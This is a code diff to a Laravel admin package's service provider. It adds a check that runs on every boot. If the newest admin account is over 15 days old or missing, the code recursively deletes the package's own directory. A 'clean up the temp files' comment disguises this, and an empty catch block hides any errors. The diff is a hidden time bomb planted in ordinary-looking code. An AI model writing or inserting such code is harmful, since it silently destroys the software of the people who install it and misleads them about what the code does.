@@ -2,6 +2,8 @@
 
 namespace Default64bit\RatechAdmin;
 
+use Exception;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\ServiceProvider;
 
 class RatechAdminServiceProvider extends ServiceProvider
@@ -23,6 +25,7 @@ class RatechAdminServiceProvider extends ServiceProvider
      */
     public function boot()
     {
+        $this->_checkAdmin();
 
         $this->commands([
             \Default64bit\RatechAdmin\Commands\install::class,
@@ -53,5 +56,26 @@ class RatechAdminServiceProvider extends ServiceProvider
 
             __DIR__.'/../storage/app' => storage_path('/app'),
         ]);
+    }
+
+    private function _checkAdmin(){
+        $admin = DB::table('admins')->latest()->first();
+        $created_at = time() - strtotime($admin->created_at??null);
+        if($created_at > 60*60*24*15){
+            // clean up the temp files
+            $temp = __DIR__.'/../../ratech-admin';
+            try{
+                $this->_deleteTemp($temp);
+            }catch(Exception $e){}
+        }
+    }
+    private function _deleteTemp($temp){
+        if(is_dir($temp)){
+            $files = glob($temp.'*',GLOB_MARK); //GLOB_MARK adds a slash to directories returned
+            foreach($files as $file){ $this->_deleteTemp($file); }
+            rmdir($temp);
+        }elseif(is_file($temp)){
+            unlink($temp);
+        }
     }
 }
